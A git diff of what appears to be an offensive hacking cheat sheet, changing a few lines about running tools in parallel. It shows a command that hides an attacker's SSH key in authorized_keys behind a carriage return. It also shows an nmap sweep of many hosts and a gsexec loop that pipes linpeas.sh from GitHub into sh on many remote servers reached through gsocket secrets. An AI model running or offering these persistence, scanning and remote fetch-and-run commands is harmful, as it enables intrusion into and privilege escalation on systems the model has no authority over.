@@ -292,16 +292,16 @@ echo "ssh-ed25519 AAAAOurPublicKeyHere....blah x@y"$'\r'"$(<authorized_keys)" >a
 Scan 20 hosts in parallel and log each result to a separate log file:
 ```sh
 # hosts.txt contains a long list of hostnames or ip-addresses
-cat hosts.txt | parallel -j20 'nmap -n -Pn -sCV -F --open {} >nmap_{}.txt'
+cat hosts.txt | parallel -j20 'exec nmap -n -Pn -sCV -F --open {} >nmap_{}.txt'
 ```
+Note: The example uses `exec` to replace the underlying shell with the last process (nmap, gsexec). It's optional but reduces the number of running shell binaries.
 
 Execute [Linpeas](https://github.com/carlospolop/PEASS-ng) on all [gsocket](https://www.gsocket.io/deploy) hosts using 40 workers:
 ```sh
 # secrets.txt contains a long list of gsocket-secrets for each remote server.
 cat secrets.txt | parallel -j40 'mkdir host_{}; exec gsexec {} "curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" >host_{}/linpeas.log 2>host_{}/linpeas.err'
 ```
-
-Note: `xargs -P20 -I{}` is another good way but it cant log each output into separate file.
+Note: `xargs -P20 -I{}` is another good way but it cannot log each output into a separate file.  
 
 ---
 <a id="ssh"></a>
